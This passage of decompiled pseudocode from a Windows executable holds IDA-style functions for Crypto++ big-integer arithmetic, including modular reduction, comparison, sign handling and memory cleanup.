  _DWORD v27[2]; // [esp+ACh] [ebp+48h] BYREF
  unsigned int v28; // [esp+B4h] [ebp+50h]
  unsigned int v29; // [esp+B8h] [ebp+54h]
  void *Block; // [esp+BCh] [ebp+58h]
  int v31; // [esp+C4h] [ebp+60h]

  v31 = 0;
  v4 = *(_DWORD *)(a3 + 12);
  if ( v4 && (**(_BYTE **)(a3 + 16) & 1) != 0 )
  {
    v5 = 4 * v4;
    v25[3] = (void *)0x3FFFFFFF;
    v25[4] = (void *)(4 * v4);
    v26 = (void *)sub_41E7A0(4 * v4, 0);
    v17 = *(_DWORD *)(a3 + 12);
    v22 = 10;
    sub_43D360(v27, 0, v17);
    v18 = *(_DWORD *)(a3 + 12);
    LOBYTE(v22) = 11;
    v6 = sub_43EA70(Block, v26, *(char **)(this + 16), *(_DWORD *)(this + 12), *(char **)(a3 + 16), v18);
    v7 = Block;
    sub_441840(Block, Block, v6, *(_DWORD *)(a3 + 16), *(_DWORD *)(a3 + 12));
    sub_43D420(a2, v27);
    v31 = 1;
    v8 = v29;
    LOBYTE(v22) = 12;
    if ( v28 < v29 )
      v8 = v28;
    memset(v7, 0, 4 * v8);
    if ( v8 )
      j_j_unknown_libname_61(Block);
    else
      j_j___free_base(Block);
    v22 = 13;
    if ( v5 > 0x3FFFFFFF )
      v5 = 0x3FFFFFFF;
    memset(v26, 0, 4 * v5);
    if ( v5 )
      j_j_unknown_libname_61(v26);
    else
      j_j___free_base(v26);
    return a2;
  }
  if ( *(_DWORD *)(a3 + 20) != 1 )
  {
    v9 = *(_DWORD **)(a3 + 16);
    if ( !*v9 )
    {
      if ( !v4 )
      {
LABEL_19:
        sub_43D420(a2, &dword_4EEE04);
        return a2;
      }
      v10 = &v9[v4 - 1];
      while ( !*v10 )
      {
        --v10;
        if ( !--v4 )
          goto LABEL_19;
      }
    }
  }
  if ( !*(_DWORD *)(this + 12) || (**(_BYTE **)(this + 16) & 1) == 0 )
    goto LABEL_19;
  if ( sub_43DD20((_DWORD *)this, (int)&dword_4EEE1C) )
  {
    sub_43D420(a2, &dword_4EEE1C);
    return a2;
  }
  sub_4432F0((_DWORD *)a3, v24, (_DWORD *)this);
  v22 = 3;
  sub_442CD0(v27, this);
  sub_4066A0((int)v24);
  if ( sub_43DCE0(v27) )
  {
    v12 = sub_43D420(v19, &dword_4EEE04);
    LOBYTE(v22) = 4;
    v13 = 2;
  }
  else
  {
    sub_43D500(v24, 1u);
    v22 = 5;
    v31 = 4;
    v14 = sub_43DF90(v20, this, (int)v27);
    v22 = 6;
    v31 = 12;
    v15 = sub_43DD70(v21, a3, (int)v14);
    v22 = 7;
    v31 = 28;
    sub_443C50(v15, v25, (int)v24);
    v22 = 8;
    v31 = 188;
    v12 = sub_43E090(v23, v25, (_DWORD *)this);
    v22 = 9;
    v13 = 252;
  }
  v31 = v13;
  sub_43D420(a2, v12);
  v16 = v13 | 1;
  if ( (v16 & 0x40) != 0 )
  {
    v16 &= ~0x40u;
    sub_4066A0((int)v23);
  }
  if ( (v16 & 0x20) != 0 )
  {
    v16 &= ~0x20u;
    sub_4066A0((int)v25);
  }
  if ( (v16 & 0x10) != 0 )
  {
    v16 &= ~0x10u;
    sub_4066A0((int)v21);
  }
  if ( (v16 & 8) != 0 )
  {
    v16 &= ~8u;
    sub_4066A0((int)v20);
  }
  if ( (v16 & 4) != 0 )
  {
    v16 &= ~4u;
    sub_4066A0((int)v24);
  }
  if ( (v16 & 2) != 0 )
    sub_4066A0((int)v19);
  sub_4066A0((int)v27);
  return a2;
}
// 442E44: conditional instruction was optimized away because edx.4!=0
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4EEE04: using guessed type int dword_4EEE04;
// 4EEE1C: using guessed type int dword_4EEE1C;
// 442CD0: using guessed type _DWORD var_1C[2];
// 442CD0: using guessed type _DWORD var_4C[6];
// 442CD0: using guessed type _DWORD var_B8[6];
// 442CD0: using guessed type _DWORD var_A0[6];
// 442CD0: using guessed type _DWORD var_88[6];
// 442CD0: using guessed type _DWORD var_64[6];

//----- (00442FD0) --------------------------------------------------------
bool __thiscall sub_442FD0(_DWORD *this)
{
  _DWORD *v2; // eax
  int v3; // eax
  bool v4; // bl
  unsigned int v5; // edx
  void *v6; // esi
  unsigned int v7; // edx
  void *v8; // esi
  _DWORD v10[2]; // [esp+10h] [ebp-40h] BYREF
  unsigned int v11; // [esp+18h] [ebp-38h]
  unsigned int v12; // [esp+1Ch] [ebp-34h]
  void *v13; // [esp+20h] [ebp-30h]
  void **v14; // [esp+28h] [ebp-28h] BYREF
  unsigned int v15; // [esp+30h] [ebp-20h]
  unsigned int v16; // [esp+34h] [ebp-1Ch]
  void *Block; // [esp+38h] [ebp-18h]
  int v18; // [esp+3Ch] [ebp-14h]
  int v19; // [esp+40h] [ebp-10h]
  int v20; // [esp+4Ch] [ebp-4h]

  v19 = 0;
  sub_44DEA0(this, v10);
  v20 = 1;
  if ( !byte_4EEDFC )
  {
    sub_44D8F0();
    byte_4EEDFC = 1;
  }
  v14 = &CryptoPP::Integer::`vftable';
  v15 = 0x3FFFFFFF;
  v16 = 2;
  v2 = (_DWORD *)sub_41E7A0(2u, 0);
  Block = v2;
  v18 = 0;
  v19 = 2;
  v2[1] = 0;
  *v2 = 0;
  sub_444070((int)&v14, (int)v10, (int)v10);
  v20 = 0;
  if ( this[5] == 1 )
  {
    if ( v18 == 1 )
      v3 = -sub_443E50(this, (int)&v14);
    else
      v3 = -1;
  }
  else if ( v18 == 1 )
  {
    v3 = 1;
  }
  else
  {
    v3 = sub_443E50(this, (int)&v14);
  }
  v4 = v3 == 0;
  v5 = v16;
  v6 = Block;
  if ( v15 < v16 )
    v5 = v15;
  LOBYTE(v20) = 2;
  memset(Block, 0, 4 * v5);
  if ( v5 )
    j_j_unknown_libname_61(v6);
  else
    j_j___free_base(v6);
  v7 = v12;
  v8 = v13;
  if ( v11 < v12 )
    v7 = v11;
  v20 = 3;
  memset(v13, 0, 4 * v7);
  if ( v7 )
    j_j_unknown_libname_61(v8);
  else
    j_j___free_base(v8);
  return v4;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4BAD30: using guessed type void *CryptoPP::Integer::`vftable';
// 4EEDFC: using guessed type char byte_4EEDFC;
// 442FD0: using guessed type _DWORD var_40[2];

//----- (00443130) --------------------------------------------------------
char __stdcall sub_443130(int a1)
{
  _DWORD *v1; // edx
  int v2; // eax
  _DWORD *v3; // ecx

  v1 = *(_DWORD **)(a1 + 16);
  v2 = *(_DWORD *)(a1 + 12);
  if ( v2 )
  {
    v3 = &v1[v2 - 1];
    do
    {
      if ( *v3 )
        break;
      --v3;
      --v2;
    }
    while ( v2 );
  }
  if ( v2 != 1 || *v1 != 1 )
    LOBYTE(v2) = 0;
  return v2;
}

//----- (00443170) --------------------------------------------------------
char __thiscall sub_443170(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // edx
  _DWORD *v3; // ecx

  v1 = this[3];
  v2 = (_DWORD *)this[4];
  if ( v1 )
  {
    v3 = &v2[v1 - 1];
    do
    {
      if ( *v3 )
        break;
      --v3;
      --v1;
    }
    while ( v1 );
  }
  if ( v1 != 1 || *v2 != 1 )
    LOBYTE(v1) = 0;
  return v1;
}

//----- (004431A0) --------------------------------------------------------
_DWORD *__thiscall sub_4431A0(_DWORD *this, _DWORD *a2, int a3)
{
  unsigned int v4; // edx
  int v5; // eax
  int v7; // [esp-Ch] [ebp-2Ch]
  int v8; // [esp-8h] [ebp-28h]
  int v9; // [esp-4h] [ebp-24h]

  v4 = this[3];
  if ( v4 < *(_DWORD *)(a3 + 12) )
    v4 = *(_DWORD *)(a3 + 12);
  sub_43D360(a2, 0, v4);
  v5 = *(_DWORD *)(a3 + 20);
  if ( this[5] == 1 )
  {
    if ( v5 != 1 )
    {
      sub_443D00((int)a2, (int)this, a3);
      a2[5] = 1;
      return a2;
    }
    v9 = (int)this;
    v8 = a3;
    v7 = (int)a2;
LABEL_9:
    sub_444260(v7, v8, v9);
    return a2;
  }
  v9 = a3;
  v8 = (int)this;
  v7 = (int)a2;
  if ( v5 != 1 )
    goto LABEL_9;
  sub_443D00((int)a2, (int)this, a3);
  return a2;
}

//----- (00443250) --------------------------------------------------------
_DWORD *__thiscall sub_443250(_DWORD *this, _DWORD *a2, _DWORD *a3)
{
  _DWORD *v4; // ebx
  unsigned int v5; // edx
  void *v6; // esi
  _DWORD v8[2]; // [esp+10h] [ebp-24h] BYREF
  unsigned int v9; // [esp+18h] [ebp-1Ch]
  unsigned int v10; // [esp+1Ch] [ebp-18h]
  void *Block; // [esp+20h] [ebp-14h]
  int v12; // [esp+30h] [ebp-4h]

  sub_4432F0(a2, v8, a3);
  v12 = 0;
  v4 = sub_43DBB0(this + 9, v8);
  v5 = v10;
  v6 = Block;
  if ( v9 < v10 )
    v5 = v9;
  v12 = 1;
  memset(Block, 0, 4 * v5);
  if ( v5 )
    j_j_unknown_libname_61(v6);
  else
    j_j___free_base(v6);
  return v4;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 443250: using guessed type _DWORD var_24[2];

//----- (004432F0) --------------------------------------------------------
_DWORD *__thiscall sub_4432F0(_DWORD *this, _DWORD *a2, _DWORD *a3)
{
  _DWORD *v4; // eax
  unsigned int v5; // edx
  void *v6; // ebx
  void **v8; // [esp+10h] [ebp-28h] BYREF
  unsigned int v9; // [esp+18h] [ebp-20h]
  unsigned int v10; // [esp+1Ch] [ebp-1Ch]
  void *Block; // [esp+20h] [ebp-18h]
  int v12; // [esp+24h] [ebp-14h]
  int v13; // [esp+28h] [ebp-10h]
  int v14; // [esp+34h] [ebp-4h]

  sub_43D6C0(a2);
  v14 = 0;
  v13 = 1;
  if ( !byte_4EEDFC )
  {
    sub_44D8F0();
    byte_4EEDFC = 1;
  }
  v8 = &CryptoPP::Integer::`vftable';
  v9 = 0x3FFFFFFF;
  v10 = 2;
  v4 = (_DWORD *)sub_41E7A0(2u, 0);
  Block = v4;
  v12 = 0;
  v4[1] = 0;
  *v4 = 0;
  v14 = 1;
  sub_441740(a2, &v8, this, a3);
  v5 = v10;
  v6 = Block;
  if ( v9 < v10 )
    v5 = v9;
  v14 = 2;
  memset(Block, 0, 4 * v5);
  if ( v5 )
    j_j_unknown_libname_61(v6);
  else
    j_j___free_base(v6);
  return a2;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4BAD30: using guessed type void *CryptoPP::Integer::`vftable';
// 4EEDFC: using guessed type char byte_4EEDFC;

//----- (004433F0) --------------------------------------------------------
int __thiscall sub_4433F0(_DWORD *this, unsigned int a2)
{
  _DWORD *v3; // ebx
  int v4; // esi
  _DWORD *v5; // eax
  unsigned __int64 v6; // rax
  _DWORD *v7; // ebx
  unsigned int v8; // ecx
  unsigned int v9; // edx
  _DWORD *v10; // eax
  unsigned int v11; // kr00_4
  unsigned __int64 v13; // [esp-18h] [ebp-4Ch]
  char pExceptionObject[40]; // [esp+8h] [ebp-2Ch] BYREF

  if ( !a2 )
  {
    sub_43D290(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVDivideByZero_Integer_CryptoPP__);
  }
  v3 = (_DWORD *)this[4];
  if ( ((a2 - 1) & a2) != 0 )
  {
    v4 = this[3];
    if ( v4 )
    {
      v5 = &v3[v4 - 1];
      do
      {
        if ( *v5 )
          break;
        --v5;
        --v4;
      }
      while ( v4 );
    }
    if ( a2 <= 5 )
    {
      v8 = 0;
      v9 = 0;
      if ( v4 )
      {
        v10 = &v3[v4];
        do
        {
          v11 = *--v10;
          v9 = (__PAIR64__(v9, v11) + v8) >> 32;
          v8 += v11;
          --v4;
        }
        while ( v4 );
      }
      v6 = __PAIR64__(v9, v8) % a2;
    }
    else
    {
      LODWORD(v6) = 0;
      if ( v4 )
      {
        v7 = &v3[v4];
        do
        {
          HIDWORD(v13) = v6;
          LODWORD(v13) = *--v7;
          v6 = v13 % a2;
          --v4;
        }
        while ( v4 );
      }
    }
  }
  else
  {
    LODWORD(v6) = (a2 - 1) & *v3;
  }
  if ( this[5] == 1 && (_DWORD)v6 )
    LODWORD(v6) = a2 - v6;
  return v6;
}

//----- (004434C0) --------------------------------------------------------
int __cdecl sub_4434C0(void *a1, int a2, int a3, int a4, int a5, unsigned int a6)
{
  int v6; // esi
  int result; // eax
  int v8; // esi

  sub_4449F0((int)a1, a2, a3, a5, a6);
  sub_4439C0(a2, 4 * a6 + a2, a3, (int)a1, a4, a6);
  v6 = off_4E8030(a3 + 4 * a6, a2);
  result = off_4E802C(a2, a4);
  v8 = a6 & -v6;
  if ( a1 != (void *)(a2 + 4 * v8) )
    return sub_438F30(a1, 4 * a6, (void *)(a2 + 4 * v8), 4 * a6);
  return result;
}
// 4E802C: using guessed type int (__stdcall *off_4E802C)(_DWORD, _DWORD);
// 4E8030: using guessed type int (__stdcall *off_4E8030)(int, int);

//----- (00443560) --------------------------------------------------------
int __thiscall sub_443560(int this, int a2)
{
  int v3; // ebx
  void (__thiscall ***v4)(_DWORD, int); // ecx
  int result; // eax

  *(_DWORD *)a2 = &CryptoPP::AlgorithmParametersBase::`vftable';
  *(_DWORD *)(a2 + 4) = *(_DWORD *)(this + 4);
  *(_BYTE *)(a2 + 8) = *(_BYTE *)(this + 8);
  *(_BYTE *)(a2 + 9) = *(_BYTE *)(this + 9);
  *(_DWORD *)(a2 + 12) = 0;
  v3 = *(_DWORD *)(this + 12);
  *(_DWORD *)(this + 12) = 0;
  v4 = *(void (__thiscall ****)(_DWORD, int))(a2 + 12);
  if ( v4 )
    (**v4)(v4, 1);
  *(_DWORD *)(a2 + 12) = v3;
  *(_BYTE *)(this + 9) = 1;
  *(_DWORD *)a2 = &CryptoPP::AlgorithmParametersTemplate<enum CryptoPP::Integer::RandomNumberType>::`vftable';
  result = *(_DWORD *)(this + 16);
  *(_DWORD *)(a2 + 16) = result;
  return result;
}
// 4B9390: using guessed type void *CryptoPP::AlgorithmParametersBase::`vftable';
// 4BAFB0: using guessed type void *CryptoPP::AlgorithmParametersTemplate<enum CryptoPP::Integer::RandomNumberType>::`vftable';

//----- (00443600) --------------------------------------------------------
int *sub_443600()
{
  return &dword_4EEE1C;
}
// 4EEE1C: using guessed type int dword_4EEE1C;

//----- (00443610) --------------------------------------------------------
_DWORD *__thiscall sub_443610(_DWORD *this, int *a2)
{
  int v3; // eax
  _DWORD *v4; // edx
  _DWORD *v5; // ecx
  bool v6; // cl
  int *v7; // eax
  _DWORD *v8; // ebx
  unsigned int v9; // edx
  void *v10; // esi
  _DWORD v12[2]; // [esp+10h] [ebp-24h] BYREF
  unsigned int v13; // [esp+18h] [ebp-1Ch]
  unsigned int v14; // [esp+1Ch] [ebp-18h]
  void *Block; // [esp+20h] [ebp-14h]
  int v16; // [esp+30h] [ebp-4h]

  v3 = a2[3];
  v4 = (_DWORD *)a2[4];
  if ( v3 )
  {
    v5 = &v4[v3 - 1];
    do
    {
      if ( *v5 )
        break;
      --v5;
      --v3;
    }
    while ( v3 );
  }
  v6 = v3 == 1 && *v4 == 1;
  v7 = &dword_4EEE04;
  if ( v6 )
    v7 = a2;
  sub_43D420(v12, v7);
  v16 = 0;
  v8 = sub_43DBB0(this + 9, v12);
  v9 = v14;
  v10 = Block;
  if ( v13 < v14 )
    v9 = v13;
  v16 = 1;
  memset(Block, 0, 4 * v9);
  if ( v9 )
    j_j_unknown_libname_61(v10);
  else
    j_j___free_base(v10);
  return v8;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4EEE04: using guessed type int dword_4EEE04;
// 443610: using guessed type _DWORD var_24[2];

//----- (004436E0) --------------------------------------------------------
int __thiscall sub_4436E0(int this, int a2)
{
  int v2; // edx
  char *v3; // esi
  _BYTE *v4; // ebp
  char *v5; // ecx
  unsigned int v6; // ebx
  int v7; // eax
  unsigned int v8; // ecx
  int v9; // edi
  unsigned int v11; // edi
  unsigned int v12; // eax
  unsigned int v13; // esi
  int v14; // ecx
  unsigned int v15; // eax
  int v17; // [esp+18h] [ebp+4h]

  v2 = this;
  v3 = *(char **)(this + 120);
  v4 = *(_BYTE **)(this + 52);
  v5 = *(char **)(a2 + 16);
  v6 = *(_DWORD *)(this + 24);
  v7 = *(_DWORD *)(a2 + 12);
  if ( v3 != v5 )
  {
    sub_438F30(v3, 4 * v7, v5, 4 * v7);
    v7 = *(_DWORD *)(a2 + 12);
    v2 = this;
  }
  if ( 2 * v6 != v7 )
    memset(&v3[4 * v7], 0, 4 * (2 * v6 - v7));
  sub_4434C0(v4, (int)&v3[8 * v6], (int)v3, *(_DWORD *)(v2 + 28), *(_DWORD *)(v2 + 100), v6);
  v8 = sub_43EA70(v4, v3, v4, v6, *(char **)(this + 28), v6);
  v9 = 32 * v6;
  v17 = *(_DWORD *)(this + 28);
  if ( v8 > 32 * v6 )
  {
    sub_441840(v4, v4, v8 - v9, *(_DWORD *)(this + 28), v6);
    return this + 36;
  }
  v11 = v9 - v8;
  if ( !v11 )
    return this + 36;
  do
  {
    --v11;
    v12 = 0;
    v13 = 0;
    if ( v6 )
    {
      do
      {
        v14 = v12 | (2 * *(_DWORD *)&v4[4 * v13]);
        v15 = *(_DWORD *)&v4[4 * v13];
        *(_DWORD *)&v4[4 * v13++] = v14;
        v12 = v15 >> 31;
      }
      while ( v13 < v6 );
      if ( v12 )
        goto LABEL_13;
    }
    if ( sub_440EF0((int)v4, v17, v6) >= 0 )
LABEL_13:
      off_4E8030((int)v4, v17);
  }
  while ( v11 );
  return this + 36;
}
// 4E8030: using guessed type int (__stdcall *off_4E8030)(int, int);

//----- (004437E0) --------------------------------------------------------
_DWORD *__thiscall sub_4437E0(_DWORD *this, int a2, int a3)
{
  _DWORD *v4; // eax
  void *v5; // esi
  unsigned int v6; // edi
  int v7; // eax
  _DWORD *v8; // ecx
  _DWORD *v9; // ebx
  void **v11; // [esp+10h] [ebp-28h] BYREF
  unsigned int v12; // [esp+18h] [ebp-20h]
  int v13; // [esp+1Ch] [ebp-1Ch]
  void *Block; // [esp+20h] [ebp-18h]
  int v15; // [esp+24h] [ebp-14h]
  int v16; // [esp+28h] [ebp-10h]
  int v17; // [esp+34h] [ebp-4h]

  v16 = 0;
  v17 = 0;
  if ( !byte_4EEDFC )
  {
    sub_44D8F0();
    byte_4EEDFC = 1;
  }
  v11 = &CryptoPP::Integer::`vftable';
  v12 = 0x3FFFFFFF;
  v13 = 2;
  v4 = (_DWORD *)sub_41E7A0(2u, 0);
  v4[1] = 0;
  Block = v4;
  *v4 = 0;
  v15 = 0;
  v16 = 2;
  sub_444070((int)&v11, a2, a3);
  v5 = Block;
  v6 = v13;
  if ( (*(_DWORD *)(a2 + 20) != 1) != (*(_DWORD *)(a3 + 20) != 1) )
  {
    if ( v15 == 1 || *(_DWORD *)Block )
      goto LABEL_12;
    v7 = v13;
    if ( v13 )
    {
      v8 = (char *)Block + 4 * v13 - 4;
      while ( !*v8 )
      {
        --v8;
        if ( !--v7 )
          goto LABEL_13;
      }
      if ( v7 )
LABEL_12:
        v15 = 1 - v15;
    }
  }
LABEL_13:
  v17 = 1;
  v9 = sub_43DBB0(this + 9, &v11);
  v17 = 2;
  if ( v12 < v6 )
    v6 = v12;
  memset(v5, 0, 4 * v6);
  if ( v6 )
    j_j_unknown_libname_61(v5);
  else
    j_j___free_base(v5);
  return v9;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4BAD30: using guessed type void *CryptoPP::Integer::`vftable';
// 4EEDFC: using guessed type char byte_4EEDFC;

//----- (00443930) --------------------------------------------------------
_DWORD *__thiscall sub_443930(_DWORD *this, int a2, int a3)
{
  _BYTE *v4; // ebp
  int v5; // eax
  int v6; // esi
  int v7; // ecx
  unsigned int v9; // [esp+10h] [ebp-8h]
  void *v10; // [esp+14h] [ebp-4h]

  v4 = (_BYTE *)this[30];
  v10 = (void *)this[13];
  v9 = this[6];
  sub_43EF80(
    v4,
    (int)&v4[8 * v9],
    *(_DWORD *)(a2 + 16),
    *(_DWORD *)(a2 + 12),
    *(_DWORD *)(a3 + 16),
    *(_DWORD *)(a3 + 12));
  v5 = *(_DWORD *)(a2 + 12);
  v6 = *(_DWORD *)(a3 + 12);
  v7 = 2 * v9 - v6 - v5;
  if ( v7 )
    memset(&v4[4 * v6 + 4 * v5], 0, 4 * v7);
  sub_4434C0(v10, (int)&v4[8 * v9], (int)v4, this[7], this[25], v9);
  return this + 9;
}

//----- (004439C0) --------------------------------------------------------
unsigned int __cdecl sub_4439C0(int a1, int a2, int a3, int a4, int a5, unsigned int a6)
{
  int v7; // ecx
  unsigned int result; // eax
  unsigned int v9; // esi
  int v10; // eax
  unsigned int v11; // ecx
  unsigned int v12; // ebp
  unsigned int *v13; // ebx
  int v14; // ebp
  int v15; // eax
  BOOL v16; // ecx
  int v17; // edi
  int v18; // eax
  int v19; // ebp
  int v20; // edi
  unsigned int *v21; // ebp
  int v22; // eax
  unsigned int v23; // ecx
  int v25; // [esp+4h] [ebp-8h]
  unsigned int v26; // [esp+8h] [ebp-4h]
  int v27; // [esp+24h] [ebp+18h]
  int v28; // [esp+24h] [ebp+18h]
  BOOL v29; // [esp+24h] [ebp+18h]
  BOOL v30; // [esp+24h] [ebp+18h]

  v7 = 4 * a6;
  v27 = 4 * a6;
  if ( a6 <= dword_4E8034 )
    return ((int (__cdecl *)(int, int, int, _DWORD))dword_4EEEB8[a6 >> 2])(a1, a4, a5, *(_DWORD *)(v7 + a3 - 4));
  v9 = a6 >> 1;
  v10 = sub_440EF0(a4, a4 + 4 * v9, v9);
  v11 = v9;
  if ( v10 > 0 )
    v11 = 0;
  v26 = v11;
  off_4E8030(a4 + 4 * v11, a4 + 4 * (v9 ^ v11));
  v12 = v9;
  if ( sub_440EF0(a5, a5 + 4 * v9, v9) > 0 )
    v12 = 0;
  off_4E8030(a5 + 4 * v12, a5 + 4 * (v9 ^ v12));
  sub_444810(a2, a2 + v27, a1, a1 + 4 * v9, v9);
  v13 = (unsigned int *)(a2 + v27);
  sub_444810(a1, a2 + v27, a4 + 4 * v9, a5 + 4 * v9, v9);
  v28 = off_4E8030(a3 + 4 * v9, a3);
  v25 = a2 + 4 * v9;
  if ( v26 == v12 )
  {
    v14 = v28 - off_4E802C(v13, a2);
    v29 = sub_440EF0((int)v13, a1, v9) == -1;
    v15 = off_4E8030((int)v13, v25);
    v16 = v29;
    v17 = v29 - v15;
  }
  else
  {
    v14 = off_4E8030((int)v13, a2) + v28;
    v30 = sub_440EF0((int)v13, a1, v9) == -1;
    v18 = off_4E802C(v13, v25);
    v16 = v30;
    v17 = v30 + v18;
  }
  v19 = v16 + v14;
  if ( v19 < 0 )
    v20 = v17 - sub_441320(v13, v9, -v19);
  else
    v20 = sub_4428F0(v13, v9, v19) + v17;
  v21 = (unsigned int *)(a1 + 4 * v9);
  v22 = off_4E802C(v13, v21);
  v23 = *v21;
  result = *v21 + v20 + v22;
  *v21 = result;
  if ( result < v23 )
  {
    for ( result = 1; result < v9; ++result )
    {
      if ( v21[result]++ != -1 )
        break;
    }
  }
  return result;
}
// 4E802C: using guessed type int (__stdcall *off_4E802C)(_DWORD, _DWORD);
// 4E8030: using guessed type int (__stdcall *off_4E8030)(int, int);
// 4E8034: using guessed type int dword_4E8034;
// 4EEEB8: using guessed type int dword_4EEEB8[];

//----- (00443BC0) --------------------------------------------------------
int __thiscall sub_443BC0(_DWORD *this)
{
  _DWORD *v2; // ecx
  int result; // eax
  _DWORD *i; // ecx

  if ( this[5] != 1 )
  {
    v2 = (_DWORD *)this[4];
    if ( !*v2 )
    {
      result = this[3];
      if ( !result )
        return result;
      for ( i = &v2[result - 1]; !*i; --i )
      {
        if ( !--result )
          return result;
      }
    }
  }
  result = 1 - this[5];
  this[5] = result;
  return result;
}
// 443BF0: conditional instruction was optimized away because eax.4!=0

//----- (00443C00) --------------------------------------------------------
int __thiscall sub_443C00(_DWORD *this, unsigned int a2)
{
  int v3; // ebp
  void *v4; // edx
  int result; // eax

  v3 = this[2];
  v4 = (void *)this[3];
  if ( v3 != a2 )
  {
    memset(v4, 0, 4 * v3);
    if ( v3 )
      j_j_unknown_libname_61(v4);
    else
      j_j___free_base(v4);
    result = sub_41E7A0(a2, 0);
    v4 = (void *)result;
  }
  this[2] = a2;
  this[3] = v4;
  this[1] = 0x3FFFFFFF;
  return result;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (00443C50) --------------------------------------------------------
_DWORD *__thiscall sub_443C50(_DWORD *this, _DWORD *a2, int a3)
{
  unsigned int v4; // edx
  int v5; // eax
  int v7; // [esp-Ch] [ebp-2Ch]
  int v8; // [esp-8h] [ebp-28h]
  int v9; // [esp-4h] [ebp-24h]

  v4 = this[3];
  if ( v4 < *(_DWORD *)(a3 + 12) )
    v4 = *(_DWORD *)(a3 + 12);
  sub_43D360(a2, 0, v4);
  v5 = *(_DWORD *)(a3 + 20);
  if ( this[5] == 1 )
  {
    if ( v5 == 1 )
    {
      sub_443D00((int)a2, (int)this, a3);
      a2[5] = 1;
      return a2;
    }
    v9 = (int)this;
    v8 = a3;
    v7 = (int)a2;
    goto LABEL_8;
  }
  v9 = a3;
  v8 = (int)this;
  v7 = (int)a2;
  if ( v5 == 1 )
  {
LABEL_8:
    sub_444260(v7, v8, v9);
    return a2;
  }
  sub_443D00((int)a2, (int)this, a3);
  return a2;
}

//----- (00443D00) --------------------------------------------------------
int __cdecl sub_443D00(int a1, int a2, int a3)
{
  unsigned int v5; // ecx
  unsigned int v7; // eax
  int v8; // eax
  int v9; // edx
  int v10; // eax
  int v11; // ebp
  int result; // eax
  int v13; // eax
  unsigned int v14; // eax
  unsigned int v15; // ebx
  char *v16; // eax
  int v17; // edx
  int v18; // [esp-8h] [ebp-18h]
  int v19; // [esp-4h] [ebp-14h]
  void *v20; // [esp+14h] [ebp+4h]
  void *v21; // [esp+14h] [ebp+4h]
  void *v22; // [esp+18h] [ebp+8h]
  void *v23; // [esp+18h] [ebp+8h]
  int v24; // [esp+1Ch] [ebp+Ch]

  v5 = *(_DWORD *)(a2 + 12);
  v7 = *(_DWORD *)(a3 + 12);
  if ( v5 <= v7 )
  {
    v19 = *(_DWORD *)(a3 + 16);
    v18 = *(_DWORD *)(a2 + 16);
    if ( v5 == v7 )
    {
      result = off_4E802C(v18, v19);
      goto LABEL_10;
    }
    v13 = off_4E802C(v18, v19);
    v9 = *(_DWORD *)(a3 + 12);
    v24 = v13;
    v10 = *(_DWORD *)(a2 + 12);
    v23 = (void *)(4 * v10 + *(_DWORD *)(a3 + 16));
    v11 = *(_DWORD *)(a1 + 16);
    v21 = (void *)(v11 + 4 * v10);
    if ( v21 != v23 )
    {
      sub_438F30(v21, 4 * (v9 - v10), v23, 4 * (v9 - v10));
      v9 = *(_DWORD *)(a3 + 12);
      v10 = *(_DWORD *)(a2 + 12);
      goto LABEL_8;
    }
  }
  else
  {
    v8 = off_4E802C(*(_DWORD *)(a2 + 16), *(_DWORD *)(a3 + 16));
    v9 = *(_DWORD *)(a2 + 12);
    v24 = v8;
    v10 = *(_DWORD *)(a3 + 12);
    v22 = (void *)(4 * v10 + *(_DWORD *)(a2 + 16));
    v11 = *(_DWORD *)(a1 + 16);
    v20 = (void *)(v11 + 4 * v10);
    if ( v20 != v22 )
    {
      sub_438F30(v20, 4 * (v9 - v10), v22, 4 * (v9 - v10));
      v9 = *(_DWORD *)(a2 + 12);
      v10 = *(_DWORD *)(a3 + 12);
LABEL_8:
      v11 = *(_DWORD *)(a1 + 16);
    }
  }
  result = sub_4428F0((unsigned int *)(v11 + 4 * v10), v9 - v10, v24);
LABEL_10:
  if ( result )
  {
    v14 = *(_DWORD *)(a1 + 12);
    v15 = 2 * v14;
    if ( 2 * v14 > v14 )
    {
      v16 = (char *)sub_43CD80(*(void **)(a1 + 16), v14, v15, 1);
      v17 = *(_DWORD *)(a1 + 12);
      *(_DWORD *)(a1 + 16) = v16;
      memset(&v16[4 * v17], 0, 4 * (v15 - v17));
      *(_DWORD *)(a1 + 12) = v15;
    }
    *(_DWORD *)(a1 + 8) = 0x3FFFFFFF;
    result = *(_DWORD *)(a1 + 16);
    *(_DWORD *)(result + 4 * (*(_DWORD *)(a1 + 12) >> 1)) = 1;
  }
  *(_DWORD *)(a1 + 20) = 0;
  return result;
}
// 4E802C: invalid function type '?' has been ignored
// 4E802C: using guessed type int (__stdcall *off_4E802C)(_DWORD, _DWORD);

//----- (00443E50) --------------------------------------------------------
int __thiscall sub_443E50(_DWORD *this, int a2)
{
  int v2; // edi
  unsigned int v3; // ecx
  _DWORD *v4; // eax
  int v5; // esi
  unsigned int v6; // eax
  _DWORD *v7; // edx

  v2 = this[4];
  v3 = this[3];
  if ( v3 )
  {
    v4 = (_DWORD *)(v2 + 4 * (v3 - 1));
    do
    {
      if ( *v4 )
        break;
      --v4;
      --v3;
    }
    while ( v3 );
  }
  v5 = *(_DWORD *)(a2 + 16);
  v6 = *(_DWORD *)(a2 + 12);
  if ( v6 )
  {
    v7 = (_DWORD *)(v5 + 4 * (v6 - 1));
    do
    {
      if ( *v7 )
        break;
      --v7;
      --v6;
    }
    while ( v6 );
  }
  if ( v3 == v6 )
    return sub_440EF0(v2, v5, v3);
  else
    return v6 < v3 ? 1 : -1;
}

//----- (00443EC0) --------------------------------------------------------
void __cdecl sub_443EC0(int a1, _DWORD *a2, _DWORD *a3, int a4)
{
  unsigned int v4; // ecx
  _DWORD *v5; // eax
  unsigned int v6; // eax
  _DWORD *v7; // edx
  unsigned int v8; // edi
